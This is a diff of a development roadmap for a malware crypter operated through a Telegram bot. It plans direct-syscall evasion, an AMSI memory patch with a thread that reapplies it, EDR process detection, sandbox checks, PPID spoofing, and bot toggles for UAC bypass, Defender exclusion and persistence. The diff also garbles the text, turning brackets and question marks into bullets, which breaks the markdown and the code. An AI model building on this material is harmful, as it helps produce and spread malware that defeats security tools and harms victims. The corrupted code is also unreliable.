@@ -6,12 +6,12 @@ This document outlines potential enhancements and alternative techniques that co
 
 ## Table of Contents
 
-1. [Enhanced Syscall Techniques](#enhanced-syscall-techniques)
-2. [Lifetime AMSI/ETW Patching](#lifetime-amsietw-patching)
-3. [Interactive Bot Interface](#interactive-bot-interface)
-4. [Additional Evasion Techniques](#additional-evasion-techniques)
-5. [Performance Optimizations](#performance-optimizations)
-6. [Implementation Priority](#implementation-priority)
+1. [Enhanced Syscall Techniques•(#enhanced-syscall-techniques)
+2. [Lifetime AMSI/ETW Patching•(#lifetime-amsietw-patching)
+3. [Interactive Bot Interface•(#interactive-bot-interface)
+4. [Additional Evasion Techniques•(#additional-evasion-techniques)
+5. [Performance Optimizations•(#performance-optimizations)
+6. [Implementation Priority•(#implementation-priority)
 
 ---
 
@@ -29,7 +29,7 @@ This document outlines potential enhancements and alternative techniques that co
 
 ### Alternative: Ebyte-Syscalls
 
-**Repository**: [EvilBytecode/Ebyte-Syscalls](https://github.com/EvilBytecode/Ebyte-Syscalls)
+**Repository**: [EvilBytecode/Ebyte-Syscalls•(https://github.com/EvilBytecode/Ebyte-Syscalls)
 
 **Potential Improvements**:
 
@@ -38,8 +38,8 @@ This document outlines potential enhancements and alternative techniques that co
 **Current (Indirect)**:
 ```asm
 ; Current implementation
-call [syscall_stub]  ; Jumps to dynamic stub
-    ?
+call [syscall_stub•  ; Jumps to dynamic stub
+    •
 syscall_stub:
     mov r10, rcx
     mov eax, SSN
@@ -57,15 +57,15 @@ ret
 ```
 
 **Advantages**:
-- ? Fewer memory artifacts
-- ? No stub allocation needed
-- ? Harder to hook (no intermediate calls)
-- ? Cleaner call stack
+- • Fewer memory artifacts
+- • No stub allocation needed
+- • Harder to hook (no intermediate calls)
+- • Cleaner call stack
 
 **Disadvantages**:
-- ?? More complex implementation
-- ?? SSN resolution required per-call
-- ?? Larger code size
+-  More complex implementation
+-  SSN resolution required per-call
+-  Larger code size
 
 #### SSN Resolution Techniques
 
@@ -147,7 +147,7 @@ public static class SyscallResolver
 
 ### Recommendation
 
-**Status**: ? **Worth Investigating**
+**Status**: • **Worth Investigating**
 
 **Rationale**:
 - Current indirect syscalls are effective
@@ -180,7 +180,7 @@ public static class SyscallResolver
 
 ### Alternative: Lifetime-Amsi-EtwPatch
 
-**Repository**: [EvilBytecode/Lifetime-Amsi-EtwPatch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch)
+**Repository**: [EvilBytecode/Lifetime-Amsi-EtwPatch•(https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch)
 
 **Key Concept**: "Lifetime" patching
 
@@ -194,7 +194,7 @@ public static class SyscallResolver
 public static void PatchAMSI()
 {
     IntPtr targetAddress = AmsiScanBufferAddress + 33;
-    byte[] patch = { 0x48, 0x31, 0xDB };  // xor rbx, rbx
+    byte• patch = { 0x48, 0x31, 0xDB };  // xor rbx, rbx
     
     VirtualProtect(targetAddress, 3, PAGE_RWX);
     Marshal.Copy(patch, 0, targetAddress, 3);
@@ -208,8 +208,8 @@ public static void PatchAMSI()
 public class LifetimePatcher
 {
     private Timer monitorTimer;
-    private byte[] originalBytes;
-    private byte[] patchBytes;
+    private byte• originalBytes;
+    private byte• patchBytes;
     
     public void Start()
     {
@@ -223,7 +223,7 @@ public class LifetimePatcher
     private void CheckAndRepatch(object state)
     {
         // Read current bytes
-        byte[] current = ReadMemory(targetAddress, 3);
+        byte• current = ReadMemory(targetAddress, 3);
         
         // Check if patch is still applied
         if (!BytesMatch(current, patchBytes))
@@ -273,16 +273,16 @@ public static void MonitorPatches()
 ### Advantages of Lifetime Patching
 
 **Benefits**:
-- ? Survives patch restoration attempts
-- ? Protects against EDR re-enabling AMSI
-- ? Handles dynamic NTDLL reloading
-- ? More robust against advanced defenses
+- • Survives patch restoration attempts
+- • Protects against EDR re-enabling AMSI
+- • Handles dynamic NTDLL reloading
+- • More robust against advanced defenses
 
 **Drawbacks**:
-- ?? Continuous thread overhead
-- ?? More memory reads (detection risk)
-- ?? Behavioral pattern (regular checks)
-- ?? Additional complexity
+-  Continuous thread overhead
+-  More memory reads (detection risk)
+-  Behavioral pattern (regular checks)
+-  Additional complexity
 
 ### Detection Considerations
 
@@ -318,7 +318,7 @@ public static void EnhancedPatchAMSI()
 private static bool DetectEDRPresence()
 {
     // Check for common EDR processes
-    string[] edrProcesses = { "MsMpEng", "SenseIR", "CrowdStrike", ... };
+    string• edrProcesses = { "MsMpEng", "SenseIR", "CrowdStrike", ... };
     
     foreach (var proc in Process.GetProcesses())
     {
@@ -354,7 +354,7 @@ private static bool DetectEDRPresence()
 
 ### Recommendation
 
-**Status**: ?? **Consider with Caution**
+**Status**:  **Consider with Caution**
 
 **Rationale**:
 - Current Chainski approach is effective and stealthy
@@ -383,10 +383,10 @@ private static bool DetectEDRPresence()
 
 **Text-Based Commands**:
 ```
-?? Crypter Configuration
+ Crypter Configuration
 
-1. Anti Debug: ? OFF
-2. Anti VM: ? OFF
+1. Anti Debug: • OFF
+2. Anti VM: • OFF
 ...
 Send '1' to toggle Anti Debug
 Send 'build' to build
@@ -397,16 +397,16 @@ Send 'build' to build
 **Visual Interface** (as in original bot):
 
 ```
-???????????????????????????????????????
-?  Crypter Configuration              ?
-???????????????????????????????????????
-? [Anti Debug: OFF] [Anti VM: OFF]    ?
-? [CIS Block: OFF]  [UAC: OFF]        ?
-? [Single: OFF]     [Persist: OFF]    ?
-? [Defender: OFF]   [Format: BAT]     ?
-?                                     ?
-?         [?? BUILD NOW]               ?
-???????????????????????????????????????
+•
+•  Crypter Configuration              •
+•
+• [Anti Debug: OFF• [Anti VM: OFF•    •
+• [CIS Block: OFF•  [UAC: OFF•        •
+• [Single: OFF•     [Persist: OFF•    •
+• [Defender: OFF•   [Format: BAT•     •
+•                                     •
+•         [ BUILD NOW•               •
+•
 ```
 
 **Implementation**:
@@ -415,36 +415,36 @@ Send 'build' to build
 use teloxide::types::{InlineKeyboardButton, InlineKeyboardMarkup};
 
 fn create_config_keyboard(config: &BuildConfig) -> InlineKeyboardMarkup {
-    let mut keyboard = vec![];
+    let mut keyboard = vec!•;
     
     // Row 1
     keyboard.push(vec![
         InlineKeyboardButton::callback(
-            format!("Anti Debug: {}", if config.anti_debug { "?" } else { "?" }),
+            format!("Anti Debug: {}", if config.anti_debug { "•" } else { "•" }),
             "toggle_anti_debug"
         ),
         InlineKeyboardButton::callback(
-            format!("Anti VM: {}", if config.anti_virtual_machine { "?" } else { "?" }),
+            format!("Anti VM: {}", if config.anti_virtual_machine { "•" } else { "•" }),
             "toggle_anti_vm"
         ),
-    ]);
+    •);
     
     // Row 2
     keyboard.push(vec![
         InlineKeyboardButton::callback(
-            format!("UAC Bypass: {}", if config.uac_bypass { "?" } else { "?" }),
+            format!("UAC Bypass: {}", if config.uac_bypass { "•" } else { "•" }),
             "toggle_uac"
         ),
         InlineKeyboardButton::callback(
-            format!("Defender: {}", if config.defender_exclusion { "?" } else { "?" }),
+            format!("Defender: {}", if config.defender_exclusion { "•" } else { "•" }),
             "toggle_defender"
         ),
-    ]);
+    •);
     
     // Build button
     keyboard.push(vec![
-        InlineKeyboardButton::callback("?? BUILD NOW", "build"),
-    ]);
+        InlineKeyboardButton::callback(" BUILD NOW", "build"),
+    •);
     
     InlineKeyboardMarkup::new(keyboard)
 }
@@ -465,28 +465,28 @@ async fn handle_callback(
             // Toggle setting
             session.config.anti_debug = !session.config.anti_debug;
             // Update message with new keyboard
-            update_config_menu(&bot, &callback.message, session).await?;
+            update_config_menu(&bot, &callback.message, session).await•;
         },
         "build" => {
             // Start build process
-            start_build_process(bot, callback.message.chat.id, sessions).await?;
+            start_build_process(bot, callback.message.chat.id, sessions).await•;
         },
         _ => {}
     }
     
-    bot.answer_callback_query(callback.id).await?;
+    bot.answer_callback_query(callback.id).await•;
     Ok(())
 }
 ```
 
 **Advantages**:
-- ? More intuitive interface
-- ? Visual feedback (buttons change on click)
-- ? Cleaner chat history
-- ? Mobile-friendly
-- ? Professional appearance
+- • More intuitive interface
+- • Visual feedback (buttons change on click)
+- • Cleaner chat history
+- • Mobile-friendly
+- • Professional appearance
 
-**Priority**: ? **High** (User experience improvement)
+**Priority**: • **High** (User experience improvement)
 
 ---
 
@@ -503,7 +503,7 @@ async fn handle_callback(
 string api = DecryptString(encryptedBytes);
 
 // Build on stack
-Span<char> api = stackalloc char[] { 'N', 't', 'A', 'l', 'l', 'o', 'c', ... };
+Span<char> api = stackalloc char• { 'N', 't', 'A', 'l', 'l', 'o', 'c', ... };
 ```
 
 **Benefit**: No heap allocation, harder to dump
@@ -551,10 +551,10 @@ public static bool IsSandbox()
 
 ```csharp
 // Make our process appear to be spawned by explorer.exe
-Process[] explorers = Process.GetProcessesByName("explorer");
+Process• explorers = Process.GetProcessesByName("explorer");
 if (explorers.Length > 0)
 {
-    SpoofPPID(explorers[0].Id);
+    SpoofPPID(explorers[0•.Id);
 }
 ```
 
@@ -574,7 +574,7 @@ use tokio::sync::Semaphore;
 static BUILD_SEMAPHORE: Semaphore = Semaphore::new(3); // Max 3 concurrent
 
 async fn build_with_queue(config: BuildConfig) {
-    let permit = BUILD_SEMAPHORE.acquire().await?;
+    let permit = BUILD_SEMAPHORE.acquire().await•;
     
     // Build with limited concurrency
     tokio::task::spawn_blocking(move || {
@@ -616,31 +616,31 @@ impl StubCache {
 
 ### High Priority (v1.1)
 
-1. **Interactive Bot Buttons** ???
+1. **Interactive Bot Buttons** •
    - Major UX improvement
    - Relatively easy to implement
    - High user impact
 
-2. **Build Queue System** ??
+2. **Build Queue System** 
    - Improves bot scalability
    - Moderate complexity
    - Better multi-user experience
 
 ### Medium Priority (v1.2)
 
-3. **Enhanced Syscalls (Hell's Gate)** ??
+3. **Enhanced Syscalls (Hell's Gate)** 
    - Incremental evasion improvement
    - Requires research and testing
    - Native payloads only
 
-4. **Stub Caching** ?
+4. **Stub Caching** •
    - Performance optimization
    - Moderate implementation effort
    - Reduces build times
 
 ### Low Priority (v2.0)
 
-5. **Lifetime AMSI Monitoring** ?
+5. **Lifetime AMSI Monitoring** •
    - Optional advanced feature
    - Adds complexity and overhead
    - May increase detection risk
@@ -657,29 +657,29 @@ impl StubCache {
 ## Research & Development Roadmap
 
 ### Phase 1: Analysis (Current)
-- [x] Document current implementation
-- [x] Research alternative techniques
-- [x] Identify Ebyte-Syscalls approach
-- [x] Analyze Lifetime patching concept
-- [ ] Benchmark current effectiveness
+- [x• Document current implementation
+- [x• Research alternative techniques
+- [x• Identify Ebyte-Syscalls approach
+- [x• Analyze Lifetime patching concept
+- [ • Benchmark current effectiveness
 
 ### Phase 2: Prototyping (v1.1)
-- [ ] Implement inline keyboard buttons
-- [ ] Prototype Hell's Gate syscalls
-- [ ] Test lifetime AMSI monitoring
-- [ ] Benchmark performance impact
+- [ • Implement inline keyboard buttons
+- [ • Prototype Hell's Gate syscalls
+- [ • Test lifetime AMSI monitoring
+- [ • Benchmark performance impact
 
 ### Phase 3: Integration (v1.2)
-- [ ] Add configurable syscall methods
-- [ ] Implement build queue
-- [ ] Optional lifetime patching
-- [ ] Stub caching system
+- [ • Add configurable syscall methods
+- [ • Implement build queue
+- [ • Optional lifetime patching
+- [ • Stub caching system
 
 ### Phase 4: Testing (v1.x)
-- [ ] EDR testing suite
-- [ ] Performance benchmarks
-- [ ] Stability testing
-- [ ] User feedback collection
+- [ • EDR testing suite
+- [ • Performance benchmarks
+- [ • Stability testing
+- [ • User feedback collection
 
 ---
 
@@ -698,7 +698,7 @@ These enhancements could be implemented by the community:
 - Build queue with worker pool
 - Stub caching system
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+See [CONTRIBUTING.md•(CONTRIBUTING.md) for guidelines.
 
 ---
 
@@ -723,15 +723,15 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ### Internal Documentation
 
-- [FEATURES.md](FEATURES.md) - Current feature set
-- [BOT_TECHNICAL.md](MfBuilder/BOT_TECHNICAL.md) - Bot internals
-- [CONTRIBUTING.md](CONTRIBUTING.md) - How to contribute
+- [FEATURES.md•(FEATURES.md) - Current feature set
+- [BOT_TECHNICAL.md•(MfBuilder/BOT_TECHNICAL.md) - Bot internals
+- [CONTRIBUTING.md•(CONTRIBUTING.md) - How to contribute
 
 ---
 
 ## Conclusion
 
-### Current State: Solid Foundation ?
+### Current State: Solid Foundation •
 
 The current implementation with:
 - **Chainski's AMSI bypass** (offset +33) - Proven effective
